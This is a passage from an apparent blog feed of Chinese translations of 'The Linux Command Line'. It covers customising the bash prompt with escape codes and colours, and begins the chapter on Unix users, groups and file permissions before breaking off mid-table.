<h3 id="第三个网络版本"><a href="#第三个网络版本" class="headerlink" title="第三个网络版本"></a>第三个网络版本</h3><p>特别感谢以下个人，他们提供的宝贵反馈被纳入第三个网络版本中：Steve Bragg、Lixin Duan、Sunil Joshi、Chris Knight、Jim Kovacs、Bartłomiej Majka、Bashar Maree、Frank McTipps、Justin Page、Waldo Ribeiro、Satej Kumar Sahu、Mikhail Sizov、Pickles Spill、Francesco Turco、Wolfram Volpi和Boyang Wang。</p>
<h3 id="第四个网络版本"><a href="#第四个网络版本" class="headerlink" title="第四个网络版本"></a>第四个网络版本</h3><p>特别感谢以下提供宝贵反馈并纳入第四个网络版本的个人：Enzo Cardinal、Devin Harper、Jørgen Heitmann、Jonathan Jones、Jaroslaw Kolosowski、Eric.Kammerer、Waldo Ribeiro、Nick Rose、Ben Slater和Francesco Turco。</p>
<h3 id="第五个网络版本"><a href="#第五个网络版本" class="headerlink" title="第五个网络版本"></a>第五个网络版本</h3><p>特别感谢以下提供宝贵反馈并纳入第五个网络版本的个人：John Burns、Paolo Casati、Waldo Ribeiro和Valter Wierzba。</p>
<p>最后，衷心感谢LinuxCommand.org的众多读者，他们给我寄来了许多友好的电子邮件。他们的鼓励让我认为我确实找对了方向！</p>
<p>需要您的反馈！</p>
<p>这本书是一个持续进行的项目，就像许多开源软件项目一样。如果您发现技术错误，请给我发一封邮件：<span class="exturl" data-url="bWFpbHRvOiYjOTg7JiMxMTU7JiMxMDQ7JiN4NmY7JiMxMTY7JiMxMTY7JiMxMTU7JiN4NDA7JiN4NzU7JiN4NzM7JiMxMDE7JiN4NzI7JiMxMTU7JiM0NjsmI3g3MzsmI3g2ZjsmI3g3NTsmI3g3MjsmI3g2MzsmIzEwMTsmIzEwMjsmIzExMTsmIzExNDsmI3g2NzsmI3g2NTsmI3gyZTsmIzExMDsmIzEwMTsmIzExNjs=">&#98;&#115;&#104;&#x6f;&#116;&#116;&#115;&#x40;&#x75;&#x73;&#101;&#x72;&#115;&#46;&#x73;&#x6f;&#x75;&#x72;&#x63;&#101;&#102;&#111;&#114;&#x67;&#x65;&#x2e;&#110;&#101;&#116;<i class="fa fa-external-link-alt"></i></span></p>
<p>请确保指明您正在阅读的确切版本。您的更改和建议可能会进入未来的版本。</p>
<p>进一步阅读</p>
<ul>
<li>这里是一些关于上述著名人物的维基百科文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9MaW51c19Ub3J2YWxkcw==">Linus Torvalds<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SaWNoYXJkX1N0YWxsbWFu">Richard Stallman<i class="fa fa-external-link-alt"></i></span></li>
<li>自由软件基金会和GNU项目：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9GcmVlX1NvZnR3YXJlX0ZvdW5kYXRpb24=">Free Software Foundation<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5mc2Yub3JnLw==">FSF<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnLw==">GNU<i class="fa fa-external-link-alt"></i></span></li>
<li>Richard Stallman在“GNU&#x2F;Linux”命名问题上有大量的著作：<span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL2dudS93aHktZ251LWxpbnV4Lmh0bWw=">GNU&#x2F;Linux Naming<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5nbnUub3JnL2dudS9nbnUtbGludXgtZmFxLmh0bWwjdG9vbHM=">GNU&#x2F;Linux FAQ<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>后记</p>
<p>本书最初是使用OpenOffice.org Writer在Dell Inspiron 530N上以Liberation Serif和Sans字体编写的，工厂配置为Ubuntu 8.04。文本的PDF版本是由OpenOffice.org Writer直接生成的。第二个网络版本是在相同的计算机上使用LibreOffice Writer在Ubuntu 12.04上制作的。第三和第四个网络版本是在System76 Ratel Pro计算机上使用LibreOffice Writer制作的，该计算机工厂配置为Ubuntu 14.04。第五个网络版本是在相同的计算机上使用LibreOffice Writer和Ubuntu 18.04制作的。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义提示符</title>
    <url>/2024/04/13-customizing-the-prompt/</url>
    <content><![CDATA[<h2 id="13-–-自定义提示符"><a href="#13-–-自定义提示符" class="headerlink" title="13 – 自定义提示符"></a>13 – 自定义提示符</h2><p>在这一章中，我们将看到一个看似微不足道的细节 —— 我们的 shell 提示符。这个探讨将揭示 shell 和终端模拟器程序的一些内部工作原理。</p>
<p>就像 Linux 中的许多东西一样，shell 提示符是可以高度配置的，虽然我们几乎视而不见，但一旦学会控制，提示符就是一个非常有用的工具。</p>
<span id="more"></span>

<h3 id="提示符的解剖"><a href="#提示符的解剖" class="headerlink" title="提示符的解剖"></a>提示符的解剖</h3><p>我们的默认提示符看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>请注意，它包含我们的用户名、主机名和当前工作目录，但是它是如何变成这样的呢？其实非常简单。提示符由一个名为 PS1（“prompt string 1” 的缩写）的环境变量定义。我们可以使用 echo 命令查看 PS1 的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$PS1</span></span><br><span class="line">[\u@\h \W]\$</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 如果你的结果与上面的示例不同，不要担心。每个 Linux 发行版都以稍微不同的方式定义提示字符串，有些非常独特。</p>
<p>从结果中，我们可以看到 PS1 包含一些我们在提示符中看到的字符，如括号、at 符号和美元符号，但其余的是个谜。敏锐的人会认出这些是 <em>反斜杠转义的特殊字符</em>，就像我们在第 7 章“以 Shell 视角看世界”中看到的那些。表 13-1 提供了在提示字符串中 bash 特殊对待的字符的部分列表。</p>
<p><em>表 13-1：Shell 提示中使用的转义代码</em></p>
<table>
<thead>
<tr>
<th><strong>序列</strong></th>
<th><strong>显示的值</strong></th>
</tr>
</thead>
<tbody><tr>
<td>\a</td>
<td>ASCII 响铃。遇到它时，计算机会发出哔哔声。</td>
</tr>
<tr>
<td>\d</td>
<td>当前日期以日、月、日期格式显示。例如，“星期一 5 月 26 日”。</td>
</tr>
<tr>
<td>\h</td>
<td>本地计算机的主机名（去掉尾随的域名）。</td>
</tr>
<tr>
<td>\H</td>
<td>完整主机名。</td>
</tr>
<tr>
<td>\j</td>
<td>当前 shell 会话中运行的作业数。</td>
</tr>
<tr>
<td>\l</td>
<td>当前终端设备的名称。</td>
</tr>
<tr>
<td>\n</td>
<td>换行符。</td>
</tr>
<tr>
<td>\r</td>
<td>回车符。</td>
</tr>
<tr>
<td>\s</td>
<td>shell 程序的名称。</td>
</tr>
<tr>
<td>\t</td>
<td>当前时间以 24 小时时：分：秒格式显示。</td>
</tr>
<tr>
<td>\T</td>
<td>当前时间以 12 小时格式显示。</td>
</tr>
<tr>
<td>@</td>
<td>当前时间以 12 小时 AM&#x2F;PM 格式显示。</td>
</tr>
<tr>
<td>\A</td>
<td>当前时间以 24 小时时：分格式显示。</td>
</tr>
<tr>
<td>\u</td>
<td>当前用户的用户名。</td>
</tr>
<tr>
<td>\v</td>
<td>shell 的版本号。</td>
</tr>
<tr>
<td>\V</td>
<td>shell 的版本号和发布号。</td>
</tr>
<tr>
<td>\w</td>
<td>当前工作目录的名称。</td>
</tr>
<tr>
<td>\W</td>
<td>当前工作目录名称的最后一部分。</td>
</tr>
<tr>
<td>\!</td>
<td>当前命令的历史编号。</td>
</tr>
<tr>
<td>\#</td>
<td>在此 shell 会话中输入的命令数。</td>
</tr>
<tr>
<td>\$</td>
<td>这显示一个“$”字符，除非我们拥有超级用户特权。在这种情况下，它显示“#”字符。</td>
</tr>
<tr>
<td>\[</td>
<td>标志着一系列一个或多个非打印字符的开始。用于嵌入一些不打印的控制字符，以某种方式操纵终端模拟器，如移动光标或更改文本颜色。</td>
</tr>
<tr>
<td>\]</td>
<td>标志着非打印字符序列的结束。</td>
</tr>
</tbody></table>
<h3 id="尝试一些替代的提示设计"><a href="#尝试一些替代的提示设计" class="headerlink" title="尝试一些替代的提示设计"></a>尝试一些替代的提示设计</h3><p>有了这些特殊字符的列表，我们可以更改提示以查看效果。首先，我们将备份现有的提示字符串，以便稍后还原它。为此，我们将现有字符串复制到我们自己创建的另一个 shell 变量中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ps1_old=<span class="string">&quot;<span class="variable">$PS1</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们创建一个名为 ps1_old 的新变量，并将 PS1 的值赋给它。我们可以使用 echo 命令验证字符串是否已被复制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$ps1_old</span></span><br><span class="line">[\u@\h \W]\$</span><br></pre></td></tr></table></figure>

<p>我们可以在终端会话期间的任何时候通过简单地反转这个过程来还原原始提示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ PS1=<span class="string">&quot;<span class="variable">$ps1_old</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>现在我们准备好继续，看看如果提示字符串为空会发生什么。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ PS1=</span><br></pre></td></tr></table></figure>

<p>如果我们对提示字符串什么也不赋值，我们就什么也得到。根本没有提示字符串！提示仍然存在，但不显示任何内容，就像我们要求的那样。由于这看起来有点令人不安，我们将其替换为一个最小的提示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&quot;\$ &quot;</span></span><br></pre></td></tr></table></figure>

<p>好多了。至少现在我们可以看到我们在做什么。注意在双引号内的尾随空格。这在显示提示时提供了美元符号和光标之间的空格。</p>
<p>让我们在我们的提示中添加一个响铃。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ PS1=<span class="string">&quot;\[\a\]\$ &quot;</span></span><br></pre></td></tr></table></figure>

<p>现在，每次显示提示时，我们应该听到一个哔哔声，尽管一些系统会禁用这个“功能”。这可能会变得很烦人，但如果我们需要在执行特别长时间的命令时得到通知，这可能会很有用。请注意我们包括了 \[ 和 \] 序列。由于 ASCII 响铃（\a）不“打印”，即它不移动光标，我们需要告诉 bash，以便它能正确确定提示的长度。</p>
<p>接下来，让我们尝试创建一个包含一些主机名和当天时间信息的信息提示符。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ PS1=<span class="string">&quot;\A \h \$ &quot;</span></span><br><span class="line">17:33 linuxbox $</span><br></pre></td></tr></table></figure>

<p>将当天时间添加到提示符中将非常有用，如果我们需要跟踪执行某些任务的时间。最后，我们将创建一个与我们原始提示相似的新提示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">17:37 linuxbox $ PS1=<span class="string">&quot;&lt;\u@\h \W&gt;\$ &quot;</span></span><br><span class="line">&lt;me@linuxbox ~&gt;$</span><br></pre></td></tr></table></figure>

<p>尝试上面表格中列出的其他序列，看看是否能够创建出一个新的出色提示。</p>
<h3 id="添加颜色"><a href="#添加颜色" class="headerlink" title="添加颜色"></a>添加颜色</h3><p>大多数终端模拟器程序对于某些非打印字符序列都有响应，以控制字符属性（如颜色、粗体文本和令人讨厌的闪烁文本）和光标位置。我们稍后将讨论光标位置，但首先我们将看看颜色。</p>
<h3 id="终端混乱"><a href="#终端混乱" class="headerlink" title="终端混乱"></a>终端混乱</h3><p>在古老的时代，当终端连接到远程计算机时，存在许多竞争品牌的终端，它们都有不同的工作方式。它们有不同的键盘，并且它们都有不同的解释控制信息的方式。Unix 和类 Unix 系统有两个相当复杂的子系统来处理终端控制的混乱（称为 termcap 和 terminfo）。如果您深入终端模拟器设置的最深处，您可能会找到有关终端仿真类型的设置。</p>
<p>为了让终端说一种共同的语言，美国国家标准学会（ANSI）制定了一套标准的字符序列来控制视频终端。旧时代的 DOS 用户将记得用于启用这些代码解释的 ANSI.SYS 文件。</p>
<p>字符颜色通过在要显示的字符流中发送终端仿真器的 <em>ANSI 转义代码</em> 来控制。控制代码不会在显示器上“打印出来”；相反，终端将其解释为指令。正如我们在上面的表格中看到的，\[ 和 \] 序列用于封装非打印字符。ANSI 转义代码以八进制 033（Esc 键生成的代码）开头，后跟可选的字符属性，然后是指令。例如，将文本颜色设置为正常（属性 &#x3D; 0）、黑色的代码如下：</p>
<blockquote>
<p><strong>\033[0;30m</strong></p>
</blockquote>
<p>表 13-2 列出了可用的文本颜色。请注意，颜色分为两组，通过应用粗体字符属性（1），其外观类似于“亮”颜色。</p>
<p><em>表 13-2：用于设置文本颜色的转义序列</em></p>
<table>
<thead>
<tr>
<th><strong>序列</strong></th>
<th><strong>文本颜色</strong></th>
<th><strong>序列</strong></th>
<th><strong>文本颜色</strong></th>
</tr>
</thead>
<tbody><tr>
<td>\033[0;30m</td>
<td>黑色</td>
<td>\033[1;30m</td>
<td>深灰色</td>
</tr>
<tr>
<td>\033[0;31m</td>
<td>红色</td>
<td>\033[1;31m</td>
<td>亮红色</td>
</tr>
<tr>
<td>\033[0;32m</td>
<td>绿色</td>
<td>\033[1;32m</td>
<td>亮绿色</td>
</tr>
<tr>
<td>\033[0;33m</td>
<td>棕色</td>
<td>\033[1;33m</td>
<td>黄色</td>
</tr>
<tr>
<td>\033[0;34m</td>
<td>蓝色</td>
<td>\033[1;34m</td>
<td>亮蓝色</td>
</tr>
<tr>
<td>\033[0;35m</td>
<td>紫色</td>
<td>\033[1;35m</td>
<td>亮紫色</td>
</tr>
<tr>
<td>\033[0;36m</td>
<td>青色</td>
<td>\033[1;36m</td>
<td>亮青色</td>
</tr>
<tr>
<td>\033[0;37m</td>
<td>浅灰色</td>
<td>\033[1;37m</td>
<td>白色</td>
</tr>
</tbody></table>
<p>让我们尝试创建一个红色的提示。我们将在开头插入转义代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;me@linuxbox ~&gt;$ PS1=<span class="string">&quot;\[\033[0;31m\]&lt;\u@\h \W&gt;\$ &quot;</span></span><br><span class="line">&lt;me@linuxbox ~&gt;$</span><br></pre></td></tr></table></figure>

<p>这有效，但请注意，我们在提示之后键入的所有文本也将以红色显示。为了解决这个问题，我们将在提示的末尾添加另一个转义代码，告诉终端模拟器返回先前的颜色。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;me@linuxbox ~&gt;$ PS1=<span class="string">&quot;\[\033[0;31m\]&lt;\u@\h \W&gt;\$\[\033[0m\] &quot;</span></span><br><span class="line">&lt;me@linuxbox ~&gt;$</span><br></pre></td></tr></table></figure>

<p>好多了！</p>
<p>还可以使用表 13-3 中列出的代码设置文本的背景颜色。背景颜色不支持粗体属性。</p>
<p><em>表 13-3：用于设置背景颜色的转义序列</em></p>
<table>
<thead>
<tr>
<th><strong>序列</strong></th>
<th><strong>背景颜色</strong></th>
<th><strong>序列</strong></th>
<th><strong>背景颜色</strong></th>
</tr>
</thead>
<tbody><tr>
<td>\033[0;40m</td>
<td>黑色</td>
<td>\033[0;44m</td>
<td>蓝色</td>
</tr>
<tr>
<td>\033[0;41m</td>
<td>红色</td>
<td>\033[0;45m</td>
<td>紫色</td>
</tr>
<tr>
<td>\033[0;42m</td>
<td>绿色</td>
<td>\033[0;46m</td>
<td>青色</td>
</tr>
<tr>
<td>\033[0;43m</td>
<td>棕色</td>
<td>\033[0;47m</td>
<td>浅灰色</td>
</tr>
</tbody></table>
<p>我们可以通过对第一个转义代码进行简单更改来创建具有红色背景的提示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;me@linuxbox ~&gt;$ PS1=<span class="string">&quot;\[\033[0;41m\]&lt;\u@\h \W&gt;\$\[\033[0m\] &quot;</span></span><br><span class="line">&lt;me@linuxbox ~&gt;$</span><br></pre></td></tr></table></figure>

<p>尝试一下颜色代码，看看你能创造出什么！</p>
<p><strong>注意：</strong> 除了普通（0）和粗体（1）字符属性之外，文本还可以具有下划线（4）、闪烁（5）和反转（7）属性。出于良好的品味考虑，许多终端模拟器拒绝遵守闪烁属性。</p>
<h3 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h3><p>转义代码可用于定位光标。这通常用于在屏幕上的不同位置提供时钟或其他类型的信息，例如在每次绘制提示时在屏幕的某个上角。表 13-4 列出了定位光标的转义代码。</p>
<p><em>表 13-4：光标移动转义序列</em></p>
<table>
<thead>
<tr>
<th><strong>转义代码</strong></th>
<th><strong>操作</strong></th>
</tr>
</thead>
<tbody><tr>
<td>\033[<em>l</em>;<em>c</em>H</td>
<td>将光标移动到第 <em>l</em> 行和第 <em>c</em> 列</td>
</tr>
<tr>
<td>\033[<em>n</em>A</td>
<td>将光标向上移动 <em>n</em> 行</td>
</tr>
<tr>
<td>\033[<em>n</em>B</td>
<td>将光标向下移动 <em>n</em> 行</td>
</tr>
<tr>
<td>\033[<em>n</em>C</td>
<td>将光标向前移动 <em>n</em> 个字符</td>
</tr>
<tr>
<td>\033[<em>n</em>D</td>
<td>将光标向后移动 <em>n</em> 个字符</td>
</tr>
<tr>
<td>\033[2J</td>
<td>清除屏幕并将光标移动到左上角（第 0 行，第 0 列）</td>
</tr>
<tr>
<td>\033[K</td>
<td>从光标位置清除到当前行的末尾</td>
</tr>
<tr>
<td>\033[s</td>
<td>存储当前光标位置</td>
</tr>
<tr>
<td>\033[u</td>
<td>恢复存储的光标位置</td>
</tr>
</tbody></table>
<p>使用表 13-4 中的代码，我们将构建一个提示，每次显示提示时都在屏幕顶部绘制一个红色条，其中包含一个以黄色文本呈现的时钟。提示的代码是这个看似强大的字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&quot;\[\033[s\033[0;0H\033[0;41m\033[K\033[1;33m\t\033[0m\033[u\]</span></span><br><span class="line"><span class="string">&lt;\u@\h \W&gt;\$ &quot;</span></span><br></pre></td></tr></table></figure>

<p>表 13-5 概述了字符串的每个部分的作用。</p>
<p><em>表 13-5：复杂提示字符串的分解</em></p>
<table>
<thead>
<tr>
<th><strong>序列</strong></th>
<th>操作</th>
</tr>
</thead>
<tbody><tr>
<td>\[</td>
<td>开始一个非打印字符序列。这样做的目的是允许 bash 正确计算可见提示的大小。如果没有准确的计算，命令行编辑功能无法正确定位光标。</td>
</tr>
<tr>
<td>\033[s</td>
<td>存储光标位置。这是在在屏幕顶部绘制条和时钟后返回到提示位置所需的。<em>请注意，一些终端模拟器可能不识别此代码。</em></td>
</tr>
<tr>
<td>\033[0;0H</td>
<td>将光标移动到左上角，即第 0 行，第 0 列。</td>
</tr>
<tr>
<td>\033[0;41m</td>
<td>将背景颜色设置为红色。</td>
</tr>
<tr>
<td>\033[K</td>
<td>清除从当前光标位置（左上角）到行尾的内容。由于背景颜色现在是红色，该行将被清除为该颜色，创建我们的条。请注意，清除到行尾不会更改光标位置，光标仍然位于左上角。</td>
</tr>
<tr>
<td>\033[1;33m</td>
<td>将文本颜色设置为黄色。</td>
</tr>
<tr>
<td>\t</td>
<td>显示当前时间。尽管这是一个“打印”元素，我们仍然将其包含在提示的非打印部分，因为我们不希望 bash 在计算显示的提示的真实大小时包含时钟。</td>
</tr>
<tr>
<td>\033[0m</td>
<td>关闭颜色。这影响文本和背景。</td>
</tr>
<tr>
<td>\033[u</td>
<td>恢复先前保存的光标位置。</td>
</tr>
<tr>
<td>\]</td>
<td>结束非打印字符序列。</td>
</tr>
<tr>
<td>&lt;\u@\h \W&gt;$</td>
<td>提示字符串。</td>
</tr>
</tbody></table>
<h3 id="保存提示"><a href="#保存提示" class="headerlink" title="保存提示"></a>保存提示</h3><p>显然，我们不想一直输入那么长的提示，因此我们希望将提示存储在某个地方。我们可以通过将其添加到我们的 .bashrc 文件中使提示永久化。为此，请将以下两行添加到文件中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS1=<span class="string">&quot;\[\033[s\033[0;0H\033[0;41m\033[K\033[1;33m\t\033[0m\033[u\]</span></span><br><span class="line"><span class="string">&lt;\u@\h \W&gt;\$ &quot;</span></span><br><span class="line"><span class="built_in">export</span> PS1</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>信不信由你，提示还涉及到我们在这里没有涵盖的涉及到 shell 函数和脚本的更多内容，但这是一个不错的开始。并非每个人都会在意更改提示，因为默认提示通常是令人满意的。但对于那些喜欢折腾的人来说，Shell 提供了许多轻松愉快的小时。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p><span class="exturl" data-url="aHR0cDovL3RsZHAub3JnLw==">Linux Documentation Project<i class="fa fa-external-link-alt"></i></span> 的 <em>Bash Prompt HOWTO</em> 提供了对 shell 提示可以做什么的相当完整的讨论。它可以在此处找到：<span class="exturl" data-url="aHR0cDovL3RsZHAub3JnL0hPV1RPL0Jhc2gtUHJvbXB0LUhPV1RPLw==">http://tldp.org/HOWTO/Bash-Prompt-HOWTO/<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>Wikipedia 上有一篇关于 ANSI 转义码的很好的文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9BTlNJX2VzY2FwZV9jb2Rl">http://en.wikipedia.org/wiki/ANSI_escape_code<i class="fa fa-external-link-alt"></i></span></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>权限</title>
    <url>/2024/03/9-permissions/</url>
    <content><![CDATA[<h2 id="9-–-权限"><a href="#9-–-权限" class="headerlink" title="9 – 权限"></a>9 – 权限</h2><p>传统的Unix操作系统与MS-DOS传统中的操作系统有所不同，不仅是<em>多任务</em>系统，还是<em>多用户</em>系统。</p>
<p>这到底意味着什么呢？这意味着多于一个人可以同时使用计算机。虽然一个典型的计算机可能只有一个键盘和显示器，但仍然可以被多个用户使用。例如，如果一台计算机连接到网络或互联网，远程用户可以通过ssh（安全外壳）登录并操作计算机。实际上，远程用户可以执行图形应用程序，并在远程显示器上看到图形输出。X Window系统作为其基本设计的一部分支持此功能。</p>
<span id="more"></span>

<p>Linux的多用户能力并不是最近的“创新”，而是深深嵌入到操作系统设计中的一个功能。考虑到Unix的创建环境，这是非常合理的。多年前，在计算机变得“个人化”之前，它们是大型、昂贵且集中的。例如，一个典型的大学计算机系统由位于一个建筑物中的大型中央计算机和分布在整个校园的终端组成，每个终端都连接到大型中央计算机。计算机可以同时支持许多用户。</p>
<p>为了使这成为现实，必须设计一种方法来保护用户不受彼此的影响。毕竟，不能允许一个用户的操作导致计算机崩溃，也不能允许一个用户干扰另一个用户的文件。</p>
<p>在本章中，我们将探讨系统安全的这一重要部分，并介绍以下命令：</p>
<ul>
<li>id – 显示用户身份</li>
<li>chmod – 更改文件的模式</li>
<li>umask – 设置默认文件权限</li>
<li>su – 以另一个用户身份运行shell</li>
<li>sudo – 以另一个用户身份执行命令</li>
<li>chown – 更改文件的所有者</li>
<li>chgrp – 更改文件的组所有权</li>
<li>passwd – 更改用户密码</li>
</ul>
<h3 id="拥有者、组成员和其他人"><a href="#拥有者、组成员和其他人" class="headerlink" title="拥有者、组成员和其他人"></a>拥有者、组成员和其他人</h3><p>当我们在第3章中探索系统时，我们可能在尝试检查如&#x2F;etc&#x2F;shadow这样的文件时遇到了问题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ file /etc/shadow</span><br><span class="line">/etc/shadow: regular file, no read permission</span><br><span class="line">[me@linuxbox ~]$ less /etc/shadow</span><br><span class="line">/etc/shadow: Permission denied</span><br></pre></td></tr></table></figure>

<p>这个错误消息的原因是，作为普通用户，我们没有权限读取此文件。</p>
<p>在Unix安全模型中，用户可能会<em>拥有</em>文件和目录。当用户拥有文件或目录时，用户对其访问有控制权。用户可以属于一个<em>组</em>，这个组由一个或多个用户组成，这些用户由其所有者授予对文件和目录的访问权限。除了向组授予权限外，所有者还可以向每个人授予一定的访问权限，从Unix术语来说，这被称为<em>world</em>。要查找有关您身份的信息，请使用id命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ id</span><br><span class="line">uid=500(me) gid=500(me) groups=500(me)</span><br></pre></td></tr></table></figure>

<p>让我们看一下输出。当用户帐户被创建时，会为用户分配一个称为<em>用户ID</em>（<em>uid</em>）的数字，然后为了人们的方便，将其映射到用户名。用户被分配一个<em>主组ID</em>（<em>gid</em>）并可能属于其他组。上面的示例来自一个Fedora系统。在其他系统，如Ubuntu上，输出可能略有不同。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ id</span><br><span class="line">uid=1000(me) gid=1000(me)</span><br><span class="line">groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(v</span><br><span class="line">ideo),46(plugdev),108(lpadmin),114(admin),1000(me)</span><br></pre></td></tr></table></figure>

<p>正如我们所看到的，uid和gid数字是不同的。这仅仅是因为Fedora从500开始为常规用户帐户进行编号，而Ubuntu从1000开始。我们还可以看到Ubuntu用户属于更多的组。这与Ubuntu管理系统设备和服务的权限方式有关。</p>
<p>那么这些信息从哪里来？就像Linux中的许多事物一样，它来自几个文本文件。用户帐户在&#x2F;etc&#x2F;passwd文件中定义，组在&#x2F;etc&#x2F;group文件中定义。当创建用户帐户和组时，这些文件以及保存有关用户密码信息的&#x2F;etc&#x2F;shadow文件都会被修改。对于每个用户帐户，&#x2F;etc&#x2F;passwd文件定义了用户（登录）名称、uid、gid、帐户的真实名称、主目录和登录shell。如果我们检查&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;group的内容，我们会注意到除了常规用户帐户外，还有超级用户（uid 0）和其他各种系统用户的帐户。</p>
<p>在下一章中，当我们涵盖进程时，我们会看到这些其他“用户”实际上是相当忙碌的。</p>
<p>虽然许多类Unix系统将普通用户分配给一个名为“users”的公共组，但现代Linux的做法是创建一个唯一的、单一成员的组，与用户名称相同。这使得某些类型的权限分配变得更容易。</p>
<h3 id="读取、写入和执行"><a href="#读取、写入和执行" class="headerlink" title="读取、写入和执行"></a>读取、写入和执行</h3><p>文件和目录的访问权限是根据读取访问、写入访问和执行访问来定义的。如果我们查看ls命令的输出，我们可以得到一些关于如何实现这一点的线索：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ &gt; foo.txt</span><br><span class="line">[me@linuxbox ~]$ ls -l foo.txt</span><br><span class="line">-rw-rw-r-- 1 me me 0 2016-03-06 14:52 foo.txt</span><br></pre></td></tr></table></figure>

<p>列表的前10个字符是<em>文件属性</em>。这些字符中的第一个是<em>文件类型</em>。表9-1描述了我们最有可能看到的文件类型（还有其他不太常见的类型）：<em>表9-1：文件类型</em></p>
<table>
<thead>
<tr>
<th><strong>属性</strong></th>
<th><strong>文件类型</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-</td>
<td>常规文件。</td>
</tr>
<tr>
<td>d</td>
<td>目录。</td>
</tr>
<tr>
<td>l</td>
<td>符号链接。注意，对于符号链接，剩余的文件属性始终为“rwxrwxrwx”，并且是虚拟值。真正的文件属性是符号链接指向的文件的属性。</td>
</tr>
<tr>
<td>c</td>
<td><em>字符特殊文件</em>。这种文件类型指的是处理数据流的设备，如终端或&#x2F;dev&#x2F;null。</td>
</tr>
<tr>
<td>b</td>
<td><em>块特殊文件</em>。这种文件类型指的是处理块数据的设备，如硬盘或DVD驱动器。</td>
</tr>
</tbody></table>
<p>文件属性的其余九个字符称为<em>文件模式</em>，表示文件所有者、文件组所有者和其他所有人的读取、写入和执行权限。</p>
<table>
<thead>
<tr>
<th><strong>所有者</strong></th>
<th><strong>组</strong></th>
<th><strong>其他人</strong></th>
</tr>
</thead>
<tbody><tr>
<td>rwx</td>
<td>rwx</td>
<td>rwx</td>
</tr>
</tbody></table>
<p>表9-2描述了r、w和x模式属性对文件和目录的影响：</p>
<p><em>表9-2：权限属性</em></p>
<table>
<thead>
<tr>
<th><strong>属性</strong></th>
<th><strong>文件</strong></th>
<th><strong>目录</strong></th>
</tr>
</thead>
<tbody><tr>
<td>r</td>
<td>允许打开和读取文件。</td>
<td>如果设置了执行属性，允许列出目录内容。</td>
</tr>
<tr>
<td>w</td>
<td>允许写入或截断文件，但此属性不允许重命名或删除文件。删除或重命名文件的能力取决于目录属性。</td>
<td>如果设置了执行属性，允许在目录内创建、删除和重命名文件。</td>
</tr>
<tr>
<td>x</td>
<td>允许将文件视为程序并执行。使用脚本语言编写的程序文件还必须设置为可读才能执行。</td>
<td>允许进入目录，例如，cd <em>目录</em>。</td>
</tr>
</tbody></table>
<p>表9-3提供了一些文件属性设置的示例：</p>
<p><em>表9-3：权限属性示例</em></p>
<table>
<thead>
<tr>
<th><strong>文件属性</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>-rwx——</td>
<td>一个常规文件，由文件所有者可读、可写和可执行。其他人没有任何访问权限。</td>
</tr>
<tr>
<td>-rw——-</td>
<td>一个常规文件，由文件所有者可读和可写。其他人没有任何访问权限。</td>
</tr>
<tr>
<td>-rw-r–r–</td>
